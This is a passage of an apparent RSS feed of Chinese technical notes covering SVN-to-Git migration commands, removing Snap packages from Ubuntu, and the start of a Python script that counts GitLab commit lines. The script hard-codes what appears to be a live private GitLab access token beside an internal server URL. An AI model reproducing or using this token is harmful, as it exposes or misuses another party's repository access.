--authors-file=userinfo.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --trunk=trunk</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --tags=tags</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --branches=branches</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><ul>
<li>参数 –no-metadata 表示阻止 Git 导出 SVN 包含的一些无用信息；</li>
<li>参数 –authors-file 表示 SVN 用户映射到 Git 用户的说明文件；</li>
<li>参数 –trunk 表示指定 SVN 的 trunk 分支；</li>
<li>参数 –branches 表示指定 SVN 的支线分支；</li>
<li>参数 –tags 表示指定 SVN 的标签；</li>
</ul>
<p><strong>ignore 文件转换</strong></p>
<p>如果 SVN 库使用 svn：ignore 属性，可以使用以下命令将其转换为 .gitignore 文件：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [下载后目录]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> svn</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> show-ignore</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.gitignore</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .gitignore</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> commit</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'Convert svn:ignore properties to .gitignore.'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>“ trunk”分支重命名为“ master”</strong></p>
<p>转换后，您的主要开发分支将被命名为“ trunk”，即 SVN 中的开发分支。</p>
<p>可以使用以下命令将其重命名为 Git 标准的“ master”分支：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> trunk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>清理标签</strong></p>
<p>git-svn使所有 SVN 标签变成了 Git 中非常短的分支，形式为“标签/名称”，因此需要将这些短分支转换为实际的 Git 标签或删除掉它们，转换为 Git 标签的命令如下：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for-each-ref</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --format=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'%(refname)'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> refs/heads/tags</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> $_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.Replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'refs/heads/tags/'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> $_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "refs/heads/tags/</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -D</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "tags/</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> }</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>转换其他分支为本地 Git 分支</strong></p>
<p>除了标签转换外，还可以把远端剩下的分支变成本地 Git 分支：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for-each-ref</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --format=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'%(refname)'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> refs/remotes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> $_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.Replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">'refs/remotes/'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">,</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">''</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> {</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "refs/remotes/</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -r</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$_</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; }</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>推送至 Git 服务器</h2>
<p>VN 代码已经 clone 到本地了，接着需要 push 到 服务端</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> remote</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> origin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git@xxxx.git</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> origin</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --tags</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu中移除Snap软件包</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%B8%AD%E7%A7%BB%E9%99%A4Snap%E8%BD%AF%E4%BB%B6%E5%8C%85.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%B8%AD%E7%A7%BB%E9%99%A4Snap%E8%BD%AF%E4%BB%B6%E5%8C%85.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu中移除Snap软件包</source>
      <description>Ubuntu中移除Snap软件包 Ubuntu中移除Snap软件包 1、在你的系统中打开一个终端，使用以下命令查看已经安装的 Snap 软件包的列表。它显示了 Snap 软件包，比如 Firefox，软件商店，主题以及其它默认已经安装的核心软件包。 image-20240902153642327 Ubuntu Snap 包列表 2、按照以下的顺序移除 ...</description>
      <pubDate>Mon, 02 Sep 2024 07:40:46 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Ubuntu中移除Snap软件包</h2>
<p>1、在你的系统中打开一个终端，使用以下命令查看已经安装的 Snap 软件包的列表。它显示了 Snap 软件包，比如 Firefox，软件商店，主题以及其它默认已经安装的核心软件包。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>snap list</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>Ubuntu Snap 包列表</p>
<p>2、按照以下的顺序移除 Snap 软件包。首先移除 Firefox。然后是软件商店，和用以上命令看到的你的系统中的其它软件包。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo snap remove --purge firefox</span></span>
<span class="line"><span>sudo snap remove --purge snap-store</span></span>
<span class="line"><span>sudo snap remove --purge gnome-3-38-2004</span></span>
<span class="line"><span>sudo snap remove --purge gtk-common-themes</span></span>
<span class="line"><span>sudo snap remove --purge snapd-desktop-integration</span></span>
<span class="line"><span>sudo snap remove --purge bare</span></span>
<span class="line"><span>sudo snap remove --purge core20</span></span>
<span class="line"><span>sudo snap remove --purge snapd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>3、最后，通过 <code>apt</code> 命令移除 Snap 服务。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo apt remove --autoremove snapd</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>移除 Snap 包和其它</p>
<p>这还没完，即使你用以上命令移除了 Snap 软件包，但是如果你没有关闭 apt 触发器，<code>sudo apt update</code> 命令会再一次将 Snap 安装回来。</p>
<p>4、所以，要关闭它，我们需要在 <code>/etc/apt/preferences.d/</code> 目录下创建一个 apt 设置文件 <code>nosnap.pref</code> 来关闭 Snap 服务。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>vim /etc/apt/preferences.d/nosnap.pref</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>5、添加以下的命令行，并保存该文件。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Package: snapd</span></span>
<span class="line"><span>Pin: release a=*</span></span>
<span class="line"><span>Pin-Priority: -10</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>创建设置文件</p>
<p>如果你知道如何使用它，那么这个 apt 设置文件是一个潜在的工具。举个例子，在以上的状态中，<code>Pin-Priority -10</code> 意思就是阻止 Snap 软件包的安装。</p>
<p>与这个教程不相关的，举个例子，如果你想给所有发行版代号为 “bulleye” 的软件包超高优先权的话，那么就可以查看这些设置文件。如果你想了解更多，你可以访问 <a href="https://manpages.ubuntu.com/manpages/focal/man5/apt_preferences.5.html" target="_blank" rel="noopener noreferrer">apt 手册页</a>。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Package: *</span></span>
<span class="line"><span>Pin: release n=bullseye</span></span>
<span class="line"><span>Pin-Priority: 900</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>6、回到我们的主题，一旦你已经保存和关闭以上文件，从终端中再次运行以下命令。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo apt update</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>7、最后，从 Ubuntu 中移除 Snap 的步骤全部完成。</p>
<h2>从 Ubuntu 移除 Snap 后使用 deb 文件安装软件商店和 Firefox</h2>
<p>你已经移除了 Firefox 和软件商店，但是你的工作还需要它们。</p>
<p>要安装 apt 版的 GNOME 软件商店，你可以使用以下命令。确保使用 <code>--install-suggests</code> 参数。否则，将会再次安装上 Snap 版本的软件包管理器！</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>apt install --install-suggests gnome-software</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>要安装 Firefox，通过以下命令使用官方 PPA 仓库。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>add-apt-repository ppa:mozillateam/ppa</span></span>
<span class="line"><span>apt update</span></span>
<span class="line"><span>apt install -t 'o=LP-PPA-mozillateam' firefox</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>添加 PPA 仓库</p>
<p></p>
<p>从 PPA 仓库以 deb 文件形式安装 Firefox</p>
<p>一旦你已经安装完 Firefox，使用以下命令开启自动更新。要了解更多，<a href="https://www.debugpoint.com/2021/09/remove-firefox-snap-ubuntu/" target="_blank" rel="noopener noreferrer">访问此页</a>。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>echo 'Unattended-Upgrade::Allowed-Origins:: "LP-PPA-mozillateam:${distro_codename}";' | sudo tee /etc/apt/apt.conf.d/51unattended-upgrades-firefox</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>最后但同样重要，当运行 <code>apt</code> 时，为 Firefox 创建另一个设置文件给予以上 PPA 仓库超高优先权。如果你不这么做，<code>apt update</code> 命令会再次安装 Snap 版本 Firefox，并把它的“ Snap 朋友们”带回来    。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo gedit /etc/apt/preferences.d/mozillateamppa</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>最后，添加这些命令行并保存文件。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>Package: firefox*</span></span>
<span class="line"><span>Pin: release o=LP-PPA-mozillateam</span></span>
<span class="line"><span>Pin-Priority: 501</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>完成。</p>
]]></content:encoded>
    </item>
    <item>
      <title>GitLab统计提交代码行数Python代码</title>
      <link>https://www.geekery.cn/note-book/Gitlab/Gitlab%E7%BB%9F%E8%AE%A1%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0Python%E4%BB%A3%E7%A0%81.html</link>
      <guid>https://www.geekery.cn/note-book/Gitlab/Gitlab%E7%BB%9F%E8%AE%A1%E6%8F%90%E4%BA%A4%E4%BB%A3%E7%A0%81%E8%A1%8C%E6%95%B0Python%E4%BB%A3%E7%A0%81.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GitLab统计提交代码行数Python代码</source>
      <description>GitLab统计提交代码行数Python代码 要求统计GitLab所有项目的任何人提交代码行数 代码逻辑 获取仓库列表 克隆仓库 在本地统计 代码如下</description>
      <pubDate>Sun, 01 Sep 2024 03:58:10 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>要求统计GitLab所有项目的任何人提交代码行数</p>
</blockquote>
<h2>代码逻辑</h2>
<ul>
<li>获取仓库列表</li>
<li>克隆仓库</li>
<li>在本地统计</li>
</ul>
<h2>代码如下</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># http://gitlabr.cidana.com/</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> os</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> git </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> Repo</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> requests</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> subprocess</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_URL</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'http://gitlabr.c4a.com/'</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_TOKEN</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'hboA_yaibr3b2WwFahaQ'</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_CLONE_METHOD</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'ssh_url_to_repo'</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  # http_url_to_repo ssh_url_to_repo</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ssh_private_key </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "./id_rsa"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">merge_dict </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> get_gitlab_repositories</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    url </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">{</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_URL</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/api/v4/projects?per_page=5'</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    headers </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        'Authorization'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'Bearer </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">{</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_TOKEN</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    response </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> requests.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">get</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(url, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic">headers</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">headers)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    response.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">raise_for_status</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    repositories </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> response.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">json</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">():</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        repositories.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">append</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(i[</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">GITLAB_CLONE_METHOD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">])</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> repositories</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> clone_repository</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic">clone_url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    env </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> os.environ.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">copy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
